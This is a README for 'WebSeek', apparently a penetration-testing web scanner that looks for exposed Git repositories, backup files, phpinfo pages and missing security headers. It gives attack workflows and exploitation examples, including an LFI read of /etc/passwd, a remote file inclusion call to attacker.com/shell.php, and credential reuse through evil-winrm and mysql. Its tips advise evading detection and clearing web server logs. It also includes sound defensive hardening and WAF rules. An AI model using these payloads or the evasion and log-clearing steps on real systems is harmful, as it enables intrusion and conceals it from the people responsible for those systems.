# WebSeek - Web Vulnerability Scanner

## Overview
WebSeek is a specialized web vulnerability scanner designed for internal network assessments. It discovers common web security issues including exposed Git repositories, backup files, information disclosure, directory listings, and missing security headers.

## Features
- ✅ **Git Repository Exposure** - Detect exposed .git directories
- ✅ **Backup File Discovery** - Find .bak, .old, .zip, and other backup files
- ✅ **Information Disclosure** - Identify phpinfo, debug pages, error messages
- ✅ **Directory Listing** - Detect accessible directory indexes
- ✅ **Common Path Enumeration** - Check /admin, /backup, /config paths
- ✅ **Default Credentials Testing** - Test common admin:admin combinations
- ✅ **SSL/TLS Analysis** - Identify weak ciphers and protocols
- ✅ **Security Headers Check** - Verify presence of security headers
- ✅ **Configuration File Exposure** - Find .env, web.config, settings files
- ✅ **Multi-port Scanning** - Check 80, 443, 8080, 8443, 8888, 9090
- ✅ **Concurrent Scanning** - Fast multi-threaded operation
- ✅ **JSON Export** - Machine-parseable output

## Installation

### Prerequisites
```bash
# Python 3.6+
python3 --version

# Required packages
pip install requests urllib3
```

### Download
```bash
cd /path/to/seek-tools/
chmod +x webseek/webseek.py
```

## Usage

### Basic Commands
```bash
# Basic vulnerability scan
./webseek.py

# Full scan (all checks)
./webseek.py --full

# Git exposure detection only
./webseek.py --git

# Backup file hunting
./webseek.py --backup

# Info disclosure check
./webseek.py --info

# Test default credentials
./webseek.py -u admin -p admin

# Scan from file
./webseek.py -f targets.txt

# Fast scan (more workers)
./webseek.py -w 50 --full
```

### Command-Line Options
```
Targeting:
  IP/URL                   Single target (192.168.1.10 or http://target)
  -f, --file FILE          File containing targets

Scan Modes:
  --full                   Full scan (all checks)
  --git                    Git exposure only
  --backup                 Backup files only
  --info                   Information disclosure only
  --headers                Security headers only
  --paths                  Common paths enumeration only

Authentication:
  -u, --username USER      Username for credential testing
  -p, --password PASS      Password for credential testing

Connection:
  --ports PORTS            Ports to scan (default: 80,443,8080,8443,8888,9090)
  --timeout SECONDS        Request timeout (default: 5)
  -w, --workers N          Concurrent threads (default: 10)

Output:
  -v, --verbose            Detailed output
  -o, --output DIR         Output directory
  --json                   JSON output only
```

## Output Files

### weblist.txt
List of vulnerable web servers:
```
http://192.168.1.10 - Git Exposure, Backup Files
https://192.168.1.11 - Directory Listing, Info Disclosure
http://192.168.1.12:8080 - Missing Security Headers
```

### findings.txt
Detailed findings summary:
```
[CRITICAL] Git Repository Exposed
URL: http://192.168.1.10/.git/HEAD
Description: Full git repository accessible
Recommendation: Remove .git directory from web root

[HIGH] PHPInfo Page Accessible
URL: http://192.168.1.11/phpinfo.php
Description: Detailed PHP configuration exposed
Recommendation: Remove phpinfo page from production

[MEDIUM] Backup File Found
URL: http://192.168.1.12/config.php.bak
Size: 4,521 bytes
Recommendation: Remove backup files from web root
```

### git_repos.txt
Exposed Git repositories:
```
http://192.168.1.10/.git/
http://192.168.1.15/.git/
http://10.0.0.50/.git/
```

### backup_files.txt
Discovered backup files:
```
http://192.168.1.10/index.php.bak
http://192.168.1.11/config.old
http://192.168.1.12/database.php~
http://192.168.1.13/backup.zip
```

### web_details.json
Machine-parseable JSON export:
```json
{
  "scan_time": "2025-10-13T15:00:00",
  "total_targets": 254,
  "vulnerable_hosts": 45,
  "findings": [
    {
      "host": "192.168.1.10",
      "port": 80,
      "protocol": "http",
      "vulnerabilities": [
        {
          "type": "git_exposure",
          "severity": "CRITICAL",
          "url": "http://192.168.1.10/.git/HEAD",
          "status_code": 200,
          "details": "Full repository accessible"
        },
        {
          "type": "backup_file",
          "severity": "MEDIUM",
          "url": "http://192.168.1.10/config.php.bak",
          "size": "4521"
        }
      ],
      "missing_headers": [
        "X-Frame-Options",
        "Content-Security-Policy",
        "Strict-Transport-Security"
      ]
    }
  ]
}
```

## Vulnerability Categories

### 1. Git Repository Exposure (CRITICAL)
**What it is**: Exposed .git directory allowing source code download

**Checks**:
- `/.git/`
- `/.git/config`
- `/.git/HEAD`
- `/.git/index`

**Impact**: Complete source code disclosure, credentials in commits, intellectual property theft

**Example**:
```bash
./webseek.py --git 192.168.1.0/24
# Found: http://192.168.1.10/.git/HEAD
# Can extract: git-dumper http://192.168.1.10/.git/ output/
```

### 2. Backup File Discovery (MEDIUM-HIGH)
**What it is**: Backup files containing source code or credentials

**Checks**:
- `*.bak` - Backup files
- `*.old` - Old versions
- `*.save` - Saved files
- `*.zip` - Archive files
- `*~` - Editor backups
- `*.swp` - Vim swap files

**Impact**: Source code disclosure, credential exposure, logic flaws revealed

**Example**:
```bash
./webseek.py --backup -f webservers.txt
# Found: config.php.bak, database.yml.old, backup.zip
```

### 3. Information Disclosure (HIGH)
**What it is**: Pages revealing sensitive configuration or debug information

**Types**:
- **PHPInfo**: Full PHP configuration (phpinfo.php)
- **Debug Pages**: Stack traces, error messages
- **Directory Listings**: File and directory browsing
- **SQL Errors**: Database structure leakage

**Impact**: Information gathering, attack surface mapping, credential hints

**Example**:
```bash
./webseek.py --info http://target.com
# Found: /phpinfo.php (PHP 7.4.3, exposed paths)
# Found: / (Directory listing enabled)
```

### 4. Common Path Enumeration (LOW-MEDIUM)
**What it is**: Accessible admin panels, config pages, or sensitive paths

**Paths Checked**:
- `/admin`, `/administrator` - Admin panels
- `/backup`, `/backups` - Backup locations
- `/config`, `/configuration` - Config files
- `/phpmyadmin`, `/cpanel` - Management interfaces
- `/.env`, `/web.config` - Configuration files

**Impact**: Attack surface discovery, potential access to admin functions

**Example**:
```bash
./webseek.py --paths 10.0.0.0/24
# Found: /admin (401 Unauthorized - panel exists)
# Found: /backup (200 OK - accessible)
```

### 5. Missing Security Headers (LOW)
**What it is**: Absence of HTTP security headers

**Headers Checked**:
- `X-Frame-Options` - Clickjacking protection
- `X-Content-Type-Options` - MIME sniffing protection
- `X-XSS-Protection` - XSS filter
- `Strict-Transport-Security` - HTTPS enforcement
- `Content-Security-Policy` - Resource loading policy
- `X-Permitted-Cross-Domain-Policies` - Cross-domain policy

**Impact**: Increased attack surface, easier exploitation of other vulnerabilities

**Example**:
```bash
./webseek.py --headers https://target.com
# Missing: X-Frame-Options, CSP, HSTS
# Present: X-Content-Type-Options
```

## Attack Workflows

### Workflow 1: Initial Web Reconnaissance
```bash
# 1. Discover all web servers in network
./webseek.py 192.168.1.0/24 --full -w 50

# 2. Review critical findings
grep "CRITICAL\|HIGH" findings.txt

# 3. Extract Git repositories
cat git_repos.txt

# 4. Download exposed Git repo
git-dumper http://192.168.1.10/.git/ extracted/
cd extracted && git log --all
```

### Workflow 2: Backup File Hunting
```bash
# 1. Focus on backup files
./webseek.py -f webservers.txt --backup -v

# 2. Download found backups
for url in $(cat backup_files.txt); do
    wget "$url"
done

# 3. Analyze backup files for credentials
grep -r "password\|credential\|api_key" downloaded_backups/

# 4. Test found credentials
./webseek.py -f webservers.txt -u found_user -p found_pass
```

### Workflow 3: Information Disclosure Analysis
```bash
# 1. Check for info disclosure
./webseek.py --info 10.0.0.0/24

# 2. Review phpinfo pages
grep "phpinfo" findings.txt

# 3. Screenshot for report
firefox http://192.168.1.10/phpinfo.php
# Take screenshot

# 4. Check for exploitable versions
grep "PHP Version" findings.txt
```

### Workflow 4: Admin Panel Discovery
```bash
# 1. Enumerate common paths
./webseek.py --paths -f targets.txt

# 2. Find accessible admin panels
grep "/admin" findings.txt | grep "200 OK"

# 3. Test default credentials
./webseek.py -u admin -p admin $(cat admin_panels.txt)

# 4. Attempt access
evil-winrm -i found_host -u admin -p admin
```

## Integration with Other Tools

### With Git-Dumper
```bash
# 1. Find exposed Git repos
./webseek.py --git 192.168.0.0/16

# 2. Download repository
git-dumper http://target/.git/ output/

# 3. Extract secrets
cd output
git log --all --pretty=format:"%H" | while read hash; do
    git show $hash | grep -i "password\|api_key\|secret"
done

# 4. Check for credentials in history
truffleHog filesystem output/ --json
```

### With GitTools
```bash
# 1. Discover Git exposure
./webseek.py --git -f networks.txt

# 2. Use GitTools dumper
./gitdumper.sh http://target/.git/ output/

# 3. Extract commits
./extractor.sh output/ extracted/

# 4. Search for secrets
grep -r "password\|credential" extracted/
```

### With Burp Suite
```bash
# 1. Identify web applications
./webseek.py --full 10.0.0.0/24

# 2. Export targets
jq -r '.findings[].vulnerabilities[].url' web_details.json > burp_targets.txt

# 3. Import into Burp for deep scan
# Target > Site map > Add custom target

# 4. Active scan vulnerable hosts
```

### With Nikto
```bash
# 1. Quick WebSeek scan
./webseek.py 192.168.1.0/24

# 2. Deep scan with Nikto
for ip in $(cut -d: -f1 weblist.txt | cut -d/ -f3); do
    nikto -h $ip -output nikto_$ip.txt
done

# 3. Compare findings
grep -h "OSVDB" nikto_*.txt | sort -u
```

### With Nuclei
```bash
# 1. Discover web services
./webseek.py -f targets.txt --full

# 2. Run Nuclei on discovered hosts
nuclei -l weblist.txt -t exposures/ -t misconfiguration/

# 3. Correlate findings
# Compare WebSeek git_repos.txt with Nuclei results
```

## Exploitation Examples

### Example 1: Git Repository Exposure
```bash
# 1. Discover exposed Git
./webseek.py --git 192.168.1.10
# Found: http://192.168.1.10/.git/

# 2. Download repository
git-dumper http://192.168.1.10/.git/ source_code/

# 3. Extract credentials
cd source_code
grep -r "password\|api.*key\|secret" .

# 4. Find database credentials
cat config/database.yml
# Found: mysql://admin:SecretPass123@localhost:3306/app_db

# 5. Test credentials
./dbseek.py -u admin -p SecretPass123 192.168.1.10
```

### Example 2: Backup File Analysis
```bash
# 1. Find backup files
./webseek.py --backup http://target.com
# Found: config.php.bak

# 2. Download backup
wget http://target.com/config.php.bak

# 3. Extract credentials
cat config.php.bak | grep -i "password\|user"
# Found: $db_user = "admin"; $db_pass = "P@ssw0rd";

# 4. Access database
mysql -h target.com -u admin -p'P@ssw0rd'
```

### Example 3: PHPInfo Exploitation
```bash
# 1. Find phpinfo pages
./webseek.py --info 10.0.0.0/24
# Found: http://10.0.0.50/info.php

# 2. Review configuration
curl http://10.0.0.50/info.php | grep "allow_url_include"
# allow_url_include: On (VULNERABLE!)

# 3. Test for LFI/RFI
curl "http://10.0.0.50/page.php?file=../../../../../../etc/passwd"

# 4. Exploit if vulnerable
curl "http://10.0.0.50/page.php?file=http://attacker.com/shell.php"
```

## Detection & Defense

### Detection Indicators

**Network Level**:
- Multiple HTTP requests to common paths
- Sequential scanning patterns (/admin, /backup, etc.)
- Requests for .git/ directories
- HEAD requests (used for backup file detection)
- Unusual User-Agent strings

**Web Server Logs**:
```
192.168.1.100 - - [13/Oct/2025:15:30:01] "GET /.git/HEAD HTTP/1.1" 200
192.168.1.100 - - [13/Oct/2025:15:30:02] "GET /.git/config HTTP/1.1" 200
192.168.1.100 - - [13/Oct/2025:15:30:03] "HEAD /index.php.bak HTTP/1.1" 200
192.168.1.100 - - [13/Oct/2025:15:30:04] "HEAD /config.old HTTP/1.1" 200
```

**IDS/WAF Signatures**:
- Multiple 404 errors from single IP
- Requests to sensitive files (.git, .bak, .old)
- Directory traversal patterns
- Scanner fingerprints (Python-requests, curl)

### Defense Measures

#### 1. Remove Sensitive Files
```bash
# Find and remove Git repositories
find /var/www -name ".git" -type d -exec rm -rf {} +

# Find and remove backup files
find /var/www -name "*.bak" -o -name "*.old" -o -name "*~" -delete

# Remove info pages
rm /var/www/html/phpinfo.php /var/www/html/info.php /var/www/html/test.php
```

#### 2. Configure Web Server

**Apache (.htaccess)**:
```apache
# Block access to Git directories
RedirectMatch 404 /\.git

# Block backup file access
<FilesMatch "\.(bak|old|save|swp|tmp)$">
    Order allow,deny
    Deny from all
</FilesMatch>

# Disable directory listing
Options -Indexes

# Add security headers
Header always set X-Frame-Options "SAMEORIGIN"
Header always set X-Content-Type-Options "nosniff"
Header always set X-XSS-Protection "1; mode=block"
Header always set Strict-Transport-Security "max-age=31536000; includeSubDomains"
```

**Nginx (nginx.conf)**:
```nginx
# Block Git access
location ~ /\.git {
    deny all;
    return 404;
}

# Block backup files
location ~ \.(bak|old|save|swp|tmp)$ {
    deny all;
    return 404;
}

# Disable directory listing
autoindex off;

# Add security headers
add_header X-Frame-Options "SAMEORIGIN" always;
add_header X-Content-Type-Options "nosniff" always;
add_header X-XSS-Protection "1; mode=block" always;
add_header Strict-Transport-Security "max-age=31536000; includeSubDomains" always;
```

#### 3. Implement WAF Rules
```bash
# ModSecurity rules
SecRule REQUEST_URI "@contains /.git" \
    "id:1001,phase:1,deny,status:404,msg:'Git directory access blocked'"

SecRule REQUEST_URI "@rx \.(bak|old|save|swp)$" \
    "id:1002,phase:1,deny,status:404,msg:'Backup file access blocked'"

SecRule REQUEST_URI "@contains /phpinfo" \
    "id:1003,phase:1,deny,status:404,msg:'PHPInfo access blocked'"
```

#### 4. Enable Proper Logging
```apache
# Apache
LogFormat "%h %l %u %t \"%r\" %>s %b \"%{Referer}i\" \"%{User-Agent}i\"" combined
CustomLog /var/log/apache2/access.log combined
ErrorLog /var/log/apache2/error.log
```

#### 5. Regular Security Audits
```bash
# Weekly scan for sensitive files
find /var/www -name "*.bak" -o -name "*.old" -o -name ".git" > weekly_findings.txt

# Alert if files found
if [ -s weekly_findings.txt ]; then
    mail -s "Sensitive files found" admin@company.com < weekly_findings.txt
fi
```

### Hardening Checklist
- [ ] Remove .git directories from web root
- [ ] Delete all backup files (.bak, .old, ~)
- [ ] Remove phpinfo/test/debug pages
- [ ] Disable directory listing
- [ ] Implement security headers
- [ ] Configure WAF rules
- [ ] Enable detailed logging
- [ ] Regular security scans
- [ ] Automated file cleanup
- [ ] Monitor for scanner activity

## Troubleshooting

### No Vulnerabilities Found
```bash
# Increase timeout for slow servers
./webseek.py --timeout 10

# Try full scan
./webseek.py --full -v

# Check if hosts are reachable
nmap -p 80,443 target.ip

# Verify web service is running
curl -v http://target.ip
```

### Too Many False Positives
```bash
# Reduce scope
./webseek.py --git --backup  # Only critical checks

# Manually verify findings
for url in $(cat git_repos.txt); do
    curl -I "$url"
done
```

### Connection Timeouts
```bash
# Increase timeout
./webseek.py --timeout 15

# Reduce workers
./webseek.py -w 5

# Check network connectivity
ping target.ip
traceroute target.ip
```

### SSL/TLS Errors
```bash
# Tool already ignores SSL warnings
# But if problems persist, try HTTP only:
./webseek.py --ports 80,8080

# Test SSL manually
openssl s_client -connect target.ip:443
```

## Tips & Best Practices

### 🎯 Reconnaissance Tips
- **Start with Git scan**: Often highest value (`--git`)
- **Check backup files**: Easy wins for source code (`--backup`)
- **Full scan last**: Most comprehensive but slower (`--full`)
- **Focus on custom apps**: More likely to have issues than commercial software

### 🔒 Operational Security
- **Use VPN**: Don't scan from your real IP
- **Rate limit**: Use fewer workers (`-w 5`) to avoid detection
- **Blend in**: Scan during business hours
- **Clean logs**: Clear web server logs if you have access

### ⚡ Performance Tips
- **More workers**: Increase for faster scans (`-w 50`)
- **Target selection**: Focus on likely vulnerable hosts
- **Skip headers check**: Fastest scan without `--headers`
- **Batch processing**: Split large networks into smaller chunks

### 📊 Reporting Tips
- **Screenshot findings**: Visual proof for reports
- **Severity rating**: CRITICAL → HIGH → MEDIUM → LOW
- **Remediation steps**: Include fix recommendations
- **Timeline**: Document when issues were found

## Real-World Examples

### Example 1: Enterprise Network Scan
```bash
./webseek.py 10.0.0.0/16 --full -w 100
# Scanned: 65,536 hosts
# Found: 234 web servers
# Git exposure: 12 sites
# Backup files: 45 files
# Time: ~2 hours
```

### Example 2: Git Repository Goldmine
```bash
./webseek.py --git http://internal-app.corp.local
# Found: /.git/HEAD (200 OK)
# Downloaded: Full source code
# Extracted: Database credentials, API keys
# Result: Complete application compromise
```

### Example 3: Backup File Bonanza
```bash
./webseek.py --backup -f web_apps.txt
# Found: config.php.bak, database.yml.old, backup.zip
# Downloaded: All backup files
# Extracted: 15 sets of credentials
# Result: Access to 15 different systems
```

## Exit Codes
- **0**: Success, vulnerabilities found
- **1**: No vulnerabilities found
- **2**: Connection errors
- **3**: No targets specified

## Limitations
- Cannot bypass WAF/IPS
- Basic checks only (not a full web scanner)
- No automated exploitation
- Limited to common paths/patterns
- No JavaScript-heavy SPA support

## Related Tools
- **Nikto**: Comprehensive web vulnerability scanner
- **Nuclei**: Template-based scanner
- **Git-Dumper**: Download exposed Git repositories
- **Burp Suite**: Professional web app testing
- **OWASP ZAP**: Open-source web scanner
- **DirBuster**: Directory brute-forcing

## Credits
- Inspired by Nikto, OWASP ZAP, and Nuclei
- Git exposure detection based on common exploitation techniques
- Security headers from OWASP recommendations

---
**Author**: Seek Tools Project  
**Version**: 1.0  
**Last Updated**: October 2025  
**License**: Use responsibly, authorized testing only
